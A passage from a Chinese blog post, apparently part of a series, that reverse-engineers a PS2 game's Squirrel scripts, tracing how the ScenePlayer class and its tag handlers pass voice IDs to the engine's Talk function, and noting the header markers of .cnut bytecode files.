info.name);</span><br><span class="line">                        setIntFlag(var.tointeger());</span><br><span class="line">                    &#125; else &#123;</span><br><span class="line">                        setIntFlag(0);</span><br><span class="line">                    &#125;</span><br><span class="line">                    break;</span><br><span class="line">                case 1: // 数値 2</span><br><span class="line">                    if (var != null) &#123;</span><br><span class="line">                        setFloatFlag(var.tofloat());</span><br><span class="line">                    &#125; else &#123;</span><br><span class="line">                        setFloatFlag(0);</span><br><span class="line">                    &#125;</span><br><span class="line">                    break;</span><br><span class="line">                case 2: // 文字列</span><br><span class="line">                    if (var != null) &#123;</span><br><span class="line">                        setStringFlag(var.tostring(), info.size);</span><br><span class="line">                    &#125; else &#123;</span><br><span class="line">                        setStringFlag(&quot;&quot;, info.size);</span><br><span class="line">                    &#125;</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function restoreVariables(variables, zone, ...)</span><br><span class="line">&#123;</span><br><span class="line">    local no = 0;</span><br><span class="line">    local store = null;</span><br><span class="line">    if (vargc &gt; 0) &#123;</span><br><span class="line">        no = vargv[0];</span><br><span class="line">        if (vargc &gt; 1) &#123;</span><br><span class="line">            store = vargv[1];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    initFlag(zone, no);</span><br><span class="line">    if (zone == VAR_SYSTEMWORK) &#123;</span><br><span class="line">        zone = VAR_SYSTEM;</span><br><span class="line">    &#125;</span><br><span class="line">    for (local i=0;i&lt;variables.len();i++) &#123;</span><br><span class="line">        local info = variables[i];</span><br><span class="line">        if (info.zone == zone) &#123;</span><br><span class="line">            local var;</span><br><span class="line">            switch(info.type) &#123;</span><br><span class="line">            case 0: // 数値</span><br><span class="line">                var = getIntFlag();</span><br><span class="line">                break;</span><br><span class="line">            case 1: // 数値 2</span><br><span class="line">                var = getFloatFlag();</span><br><span class="line">                break;</span><br><span class="line">            case 2: // 数値</span><br><span class="line">                var = getStringFlag(info.size);</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">            if (store != null) &#123;</span><br><span class="line">                store[info.name] &lt;- var;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                switch (zone) &#123;</span><br><span class="line">                case 0:</span><br><span class="line">                    savef[info.name] &lt;- var;</span><br><span class="line">                    break;</span><br><span class="line">                case 1:</span><br><span class="line">                    sf[info.name] &lt;- var;</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function showVariables(variables, zone)</span><br><span class="line">&#123;</span><br><span class="line">    for (local i=0;i&lt;variables.len();i++) &#123;</span><br><span class="line">        local info = variables[i];</span><br><span class="line">        if (info.zone == zone) &#123;</span><br><span class="line">            local var;</span><br><span class="line">            switch (info.zone) &#123;</span><br><span class="line">            case VAR_GAME:</span><br><span class="line">                var = f[info.name];</span><br><span class="line">                break;</span><br><span class="line">            case VAR_SYSTEM:</span><br><span class="line">                var = sf[info.name];</span><br><span class="line">                break;</span><br><span class="line">            case VAR_TEMP:</span><br><span class="line">                var = tf[info.name];</span><br><span class="line">            &#125;</span><br><span class="line">            dm(&quot; 名前:&quot; + info.name + &quot; 値:&quot; + var);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// システムボイス情報</span><br><span class="line">sysvoices &lt;- dofile(&quot;sysvoices.nut&quot;);</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * システムボイスの再生</span><br><span class="line"> */</span><br><span class="line">function systemVoice(name) &#123;</span><br><span class="line">    if (name in sysvoices) &#123;</span><br><span class="line">        Talk(0, sysvoices[name]);</span><br><span class="line">        return TalkLength(0);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function systemVoiceStop() &#123;</span><br><span class="line">    TalkStop(0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 初期化処理</span><br><span class="line">dofile(&quot;util.nut&quot;, true);</span><br><span class="line">dofile(&quot;Object.nut&quot;, true);</span><br><span class="line">dofile(&quot;BasicLayer.nut&quot;, true);</span><br><span class="line">dofile(&quot;msgwindow.nut&quot;, true);</span><br><span class="line">dofile(&quot;translayer.nut&quot;, true);</span><br><span class="line">dofile(&quot;TEXTLAYER.NUT&quot;, true);</span><br><span class="line"></span><br><span class="line">dofile(&quot;action.nut&quot;, true);</span><br><span class="line">dofile(&quot;player.nut&quot;, true);</span><br><span class="line"></span><br><span class="line">dofile(&quot;GraphicLayer.nut&quot;, true);</span><br><span class="line">dofile(&quot;GamePlayer.nut&quot;, true);</span><br><span class="line"></span><br><span class="line">dofile(&quot;buttonlayer.nut&quot;, true);</span><br><span class="line">dofile(&quot;dialogwindow.nut&quot;, true);</span><br><span class="line">dofile(&quot;selectwindow.nut&quot;, true);</span><br><span class="line"></span><br><span class="line">dofile(&quot;EnvObject.nut&quot;, true);</span><br><span class="line">dofile(&quot;EnvBase.nut&quot;, true);</span><br><span class="line">dofile(&quot;EnvImage.nut&quot;, true);</span><br><span class="line">dofile(&quot;EnvLevelLayer.nut&quot;, true);</span><br><span class="line">dofile(&quot;EnvLayer.nut&quot;, true);</span><br><span class="line">dofile(&quot;EnvBackLayer.nut&quot;, true);</span><br><span class="line">dofile(&quot;EnvStageLayer.nut&quot;, true);</span><br><span class="line">dofile(&quot;EnvEventLayer.nut&quot;, true);</span><br><span class="line">dofile(&quot;EnvSimpleLayer.nut&quot;, true);</span><br><span class="line">dofile(&quot;EnvCharacter.nut&quot;, true);</span><br><span class="line">dofile(&quot;EnvBGM.nut&quot;, true);</span><br><span class="line">dofile(&quot;EnvSE.nut&quot;, true);</span><br><span class="line">dofile(&quot;Environment.nut&quot;, true);</span><br><span class="line">dofile(&quot;ScenePlayer.nut&quot;, true);</span><br><span class="line"></span><br><span class="line">dofile(&quot;main.nut&quot;, true);</span><br><span class="line">dofile(&quot;game.nut&quot;, true);</span><br><span class="line">dofile(&quot;override.nut&quot;, true); // ゲーム個別の初期化処理を登録する</span><br><span class="line"></span><br><span class="line">function showGlobalInfos() &#123;</span><br><span class="line">    dm(&quot;------- スクリプト側でキャッシュされてる LAYER の画像情報 ------&quot;);</span><br><span class="line">    foreach (name,value in images) &#123;</span><br><span class="line">        dm(&quot;name:&quot; + name + &quot; value:&quot; + value);</span><br><span class="line">    &#125;</span><br><span class="line">    dm(&quot;------- アニメ情報一覧 -----------&quot;);</span><br><span class="line">    foreach (name,value in animeList) &#123;</span><br><span class="line">        dm(&quot;name:&quot; + name + &quot; value:&quot; + value);</span><br><span class="line">    &#125;</span><br><span class="line">    showMemoryInfo();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有一串非常显眼的 <code>dofile</code>，并且参数包含了大量 <code>.nut</code> 结尾的文件，稍微 Google 一下可以发现这是 <code>Squirrel</code> 脚本。<code>Squirrel</code> 是一种面向对象的轻量级脚本语言，类似 Lua，常被用在游戏中。<code>Squirrel</code> 语言程序有两类，一类是 <code>.nut</code> 结尾的明文代码，另一类以 <code>.cnut</code> 结尾，类似 Python 的 <code>pyc</code> 文件，保存字节码，不过在 <code>Squirrel</code> 中这个操作不被称为“编译”，而被称为“序列化”，但是可惜的是 <code>Squirrel</code> 并没有提供反序列化这个操作，换句话说我们还是需要自己想办法将 <code>.cnut</code> 恢复成 <code>.nut</code> 文件。</p><p>基于此，我们将提取出的文件后缀改文 <code>.nut</code>。从 <code>SYSTEM.BIN</code> 中一共提取了 42 个文件，但是其中前 32 个都是明文代码，从第 33 个文件（32_5b000_8688.nut）到最后发现并不是明文，而是包含了大量二进制数据，其中夹杂着部分明文字符串。</p><p><img src="/2023/06/12/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%89%EF%BC%89/17.jpg" alt="32_5b000_8688.nut"></p><p>实际上根据曾经逆向 <code>.pyc</code> 的经验，可以猜出这可能就是 <code>.cnut</code> 字节码文件，里面保存着一些符号。连续打开好几个这类文件，都可以看到很明显的特征：</p><ol><li><code>\xfa\xfaRIQS</code> 开头</li><li>包含了大量的 <code>TRAP</code> 字符串</li><li>开头会出现一个路径 <code>DataMake/xxx/xxx.nut</code></li></ol><p>根据这些特征也可以推断出这就是 <code>.cnut</code> 字节码文件。实际上 <code>.cnut</code> 是用小端存储的，<code>RIQS</code> 也就是 <code>SQIR</code> 是 <code>Squirrel</code> 的缩写，<code>TRAP</code> 也就是 <code>PART</code>，顾名思义是作为分隔符。</p><p>暂时先不管这些字节码，我们的目标是找到角色的语音文本，看了前 32 个脚本，在 <code>14_24000_56d1.nut</code> 中发现有一个 <code>playVoice</code> 函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * ボイス再生</span><br><span class="line"> * @param name キャラ名</span><br><span class="line"> * @param voicefile 再生ファイル</span><br><span class="line"> */</span><br><span class="line">function playVoice(name, voicefile) &#123;</span><br><span class="line">    if (isSkip() || !voiceenable) &#123;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    // ボイス情報取得</span><br><span class="line">    local configName = &quot;etc&quot;;</span><br><span class="line">    if (name in voiceConfigs) &#123;</span><br><span class="line">        configName = voiceConfigs[name];</span><br><span class="line">    &#125;</span><br><span class="line">    if (!getVoiceOn(configName)) &#123;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // ボリューム調整</span><br><span class="line">    // volume = getVoiceVolume(configName);</span><br><span class="line">    if (typeof voicefile == &quot;integer&quot;) &#123;</span><br><span class="line">        // ボイス再生処理</span><br><span class="line">        dm(&quot; ボイス再生:&quot; + voicefile);</span><br><span class="line">        Talk(0, voicefile);</span><br><span class="line">        talkVoiceLength = TalkLength(0);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        dm(&quot; ボイスが再生できない（コンバート時に存在していない）&quot; + voicefile);</span><br><span class="line">    &#125;</span><br><span class="line">    // 時間を返す</span><br><span class="line">    return talkVoiceLength;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中调用 <code>Talk(0, voicefile)</code> 猜测可能是让角色讲话，而 <code>voicefile</code> 是一个 int，应该就是从 <code>VOICE_ID.bin</code> 中提取出的声音文件的 id，<code>0</code> 代表什么暂时未知。可惜的是，在其他几个明文脚本中均未找到 <code>Talk</code> 函数的定义。根据 <code>playVoice</code> 函数注释（的翻译），<code>name</code> 参数表示角色名，<code>voicefile</code> 参数表示要播放的文件，但是最后影响 <code>Tlak</code> 函数的仅有 <code>voicefile</code>，而 <code>name</code> 仅用来判断该角色是否存在于 <code>voiceConfigs</code>。</p><p>首先我们先看一下 <code>playVoice</code> 从哪里会被调用，发现主要是在 <code>28_43000_d330.nut</code> 文件的 <code>playVoices</code> 中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * 複数ボイスを鳴らす</span><br><span class="line"> * @return 最長のボイス再生時間</span><br><span class="line"> */</span><br><span class="line">function playVoices(voices) &#123;</span><br><span class="line">    local ret = null;</span><br><span class="line">    if (!isJump() &amp;&amp; voices != null) &#123;</span><br><span class="line">        foreach (name, info in voices) &#123;</span><br><span class="line">            local r;</span><br><span class="line">            // デフォルト名の場合の処理</span><br><span class="line">            if (isDefaultName() &amp;&amp; info.voicen != null) &#123;</span><br><span class="line">                r = playVoice(name, info.voicen);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                r = playVoice(name, info.voice);</span><br><span class="line">            &#125;</span><br><span class="line">            if (ret == null || r != null &amp;&amp; r &gt; ret) &#123;</span><br><span class="line">                    ret = r;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>playVoice</code> 中的 <code>voicefile</code> 来自 <code>playVoices</code> 中的 <code>voices</code>字典，也就是其参数，保存了多个 <code>(name, voicefile)</code> 键值对。这个函数仅在该文件中的 <code>playNextVoice</code> 被调用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * ボイス再生実行</span><br><span class="line"> */</span><br><span class="line">function playNextVoice() &#123;</span><br><span class="line">    if (nextvoices != null) &#123;</span><br><span class="line">        local ret = playVoices(nextvoices);</span><br><span class="line">        clearNextVoice();</span><br><span class="line">        return ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到 <code>playVoices</code> 中的 <code>voices</code> 字典来自全局变量 <code>nexvoices</code>。接下来再找找 <code>nextvoices</code> 的写值操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">// 次回再生するボイス情報</span><br><span class="line">// キー: キャラクタ名</span><br><span class="line">// 値: ボイス</span><br><span class="line">nextvoices = null;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 次回同時に鳴らすボイスの追加</span><br><span class="line"> * @param name キャラ名</span><br><span class="line"> * @param voice  ボイス指定</span><br><span class="line"> * @param voicen 非デフォルト時ボイス指定</span><br><span class="line"> */</span><br><span class="line">function entryNextVoice(name, voice, voicen) &#123;</span><br><span class="line">    if (name != null &amp;&amp; voice != null) &#123;</span><br><span class="line">        if (nextvoices == null) &#123;</span><br><span class="line">            nextvoices = &#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">        nextvoices[name] &lt;- &#123;voice=voice, voicen=voicen&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 次回鳴らすボイスの情報をクリア</span><br><span class="line"> */</span><br><span class="line">function clearNextVoice() &#123;</span><br><span class="line">    nextvoices = null;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据注释，<code>nextvoices</code> 的作用是保存“下次播放的声音信息”，键为“角色名”，值为“声音”，并且仅在 <code>entryNextVoice</code> 中被写入，同时写入了 <code>voice</code> 也就是“语音指定”以及 <code>voicen</code> 也就是“非默认语音指定”两个信息，那么再找找哪里调用该函数写入接下来要播放的声音信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * ボイス追加</span><br><span class="line"> */</span><br><span class="line">function tag_entryvoice(elm) &#123;</span><br><span class="line">    entryNextVoice(elm.name, elm.voice, getval(elm, &quot;voicen&quot;));</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 名前表示</span><br><span class="line"> */</span><br><span class="line">function tag_dispname(elm) &#123;</span><br><span class="line">    // ...</span><br><span class="line">    </span><br><span class="line">    //dm(&quot; 名前表示ハンドラ &quot;);</span><br><span class="line">    if (elm == null || !(&quot;name&quot; in elm)  || elm.name == &quot;&quot;) &#123;</span><br><span class="line">        // ...</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        </span><br><span class="line">        local name = getval(elm, &quot;name&quot;);</span><br><span class="line">        local disp = getval(elm, &quot;disp&quot;);</span><br><span class="line">        </span><br><span class="line">        local ch = env.getCharacter(name, null);</span><br><span class="line">        env.currentNameTarget = ch;</span><br><span class="line">        if (&quot;voice&quot; in elm) &#123;</span><br><span class="line">            entryNextVoice(name, elm.voice, getval(elm, &quot;voicen&quot;));</span><br><span class="line">        &#125;</span><br><span class="line">        // 名前の決定</span><br><span class="line">        // ...</span><br><span class="line">        </span><br><span class="line">        // 名前加工処理</span><br><span class="line">        // ...</span><br><span class="line">        </span><br><span class="line">        // 表情判定</span><br><span class="line">        // ...</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // 名前表示</span><br><span class="line">    // ...</span><br><span class="line">    </span><br><span class="line">    // ボイス再生</span><br><span class="line">    if (nextvoices != null) &#123;</span><br><span class="line">        local ret = playNextVoice();</span><br><span class="line">        if (ret &gt; 0) &#123;</span><br><span class="line">            addAutoWait(ret);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样在 <code>28_43000_d330.nut</code> 文件中，有两个 <code>tag</code> 开头的函数：<code>tag_entryvoice</code> 以及 <code>tag_dispname</code>。可以看到 <code>name</code>，<code>voice</code> 以及 <code>voicen</code> 主要来自 <code>elm</code> 参数。</p><p>根据注释以及代码逻辑，<code>tag_entryvoice</code> 的作用是在某个时刻追加要播放的声音，而主要播放逻辑在 <code>tag_dispname</code> 中，首先调用 <code>entryNextVoice</code> 从 <code>elm</code> 中获取所有接下来要播放的声音添加到全局变量 <code>nextvoices</code> 中，之后以此处理名称，名称前缀以及表情等，最后再调用 <code>palyNextVoice</code> 播放这些声音，并且阻塞等待播放完毕。</p><p>这些 <code>tag</code> 开头的函数作为回调函数保存在同文件的 <code>getHandlers</code> 函数中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function getHandlers()</span><br><span class="line">&#123;</span><br><span class="line">    return &#123; // 辞書配列オブジェクト</span><br><span class="line">        // ...</span><br><span class="line">        //----------------------------------------------- ボイス制御</span><br><span class="line">        </span><br><span class="line">        entryvoice    = tag_entryvoice,</span><br><span class="line">        // ...</span><br><span class="line">        dispname      = tag_dispname,</span><br><span class="line">        // ...</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来找找哪里获取并调用了这几个回调函数。同样仅在 <code>28_43000_d330.nut</code> 中 <code>ScenePlayer</code> 类的构造函数 <code>constructor</code> 调用 <code>getHandlers</code> 获取所有回调函数保存在 <code>handlers</code> 中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * シーン再生プレイヤー</span><br><span class="line"> * ・シーンの再生機能</span><br><span class="line"> * ・シーンのセーブとロード</span><br><span class="line"> */</span><br><span class="line">class ScenePlayer extends GamePlayer</span><br><span class="line">&#123;</span><br><span class="line">    // ...</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * コンストラクタ</span><br><span class="line">     */</span><br><span class="line">    constructor() &#123;</span><br><span class="line">        ::GamePlayer.constructor();</span><br><span class="line">        pendings = [];</span><br><span class="line">        branches = [];</span><br><span class="line">        targetBranches = [];</span><br><span class="line">        env = Environment(this, SCWIDTH, SCHEIGHT);</span><br><span class="line">        if (&quot;nameImageMap&quot; in env.envinfo) &#123;</span><br><span class="line">            setNameImageMap(env.envinfo.nameImageMap);</span><br><span class="line">        &#125;</span><br><span class="line">        sceneInfos = dofile(&quot;scenes.nut&quot;);</span><br><span class="line">        handlers = getHandlers();</span><br><span class="line">        historyInit();</span><br><span class="line">        selectOption = &#123;&#125;;</span><br><span class="line">        caches = &#123;&#125;;</span><br><span class="line">        particles = &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据注释，这个类是一个“场景再生播放器”，负责“场景的再生功能”以及“场景的保存和载入”，在日语中“再生”就是重放的意思，那么肯定是在这个类中根据场景的变换，播放文本以及对应的音频。实际上 <code>28_43000_d330.nut</code> 文件中的函数以及全局变量（类的静态变量）都属于这个类，包括 <code>playVoices</code>，<code>playNextVoice</code>，<code>nexvoices</code>，<code>entryNextVoice</code>，<code>tag_entryvoice</code>，<code>tag_dispname</code>，<code>getHandlers</code> 以及下面的 <code>onTag</code>。再找找哪里使用了 <code>handlers</code>，发现主要是在同文件同类下的 <code>onTag</code> 中。 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * タグの処理</span><br><span class="line"> */</span><br><span class="line">function onTag(elm) &#123;</span><br><span class="line">    local tagname = elm.tagname;</span><br><span class="line">    //dm(&quot; シーンタグ:&quot; + tagname);</span><br><span class="line">    if (tagname in handlers) &#123;</span><br><span class="line">        local handler = handlers[tagname];</span><br><span class="line">        local ret = handler(elm);</span><br><span class="line">        lastTagName = tagname;</span><br><span class="line">        return ret;</span><br><span class="line">    &#125;</span><br><span class="line">    // 無効なタグ</span><br><span class="line">    local ret = env.unknown(tagname, elm);</span><br><span class="line">    if (ret == null) &#123;</span><br><span class="line">        local msg = &quot; タグ / マクロ \&quot;&quot; + tagname + &quot;\&quot; は存在しません &quot;;</span><br><span class="line">        errorCmd(msg);</span><br><span class="line">        return 0;</span><br><span class="line">        //throw new Exception(msg);</span><br><span class="line">    &#125;</span><br><span class="line">    return ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过 <code>onTag</code> 可以发现 <code>elm</code> 中会保存 <code>tagname</code>，也就是对应的回调函数名称，而这个函数则就是调用 <code>elm</code> 指定的回调函数，并且回调参数固定为 <code>elm</code>。接下来再找找哪里调用了 <code>onTag</code>，也许就可以找到哪里给 <code>elm</code> 指定了回调函数，发现同样是在同文件同类下的一个非常大的函数 <code>run</code> 中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span 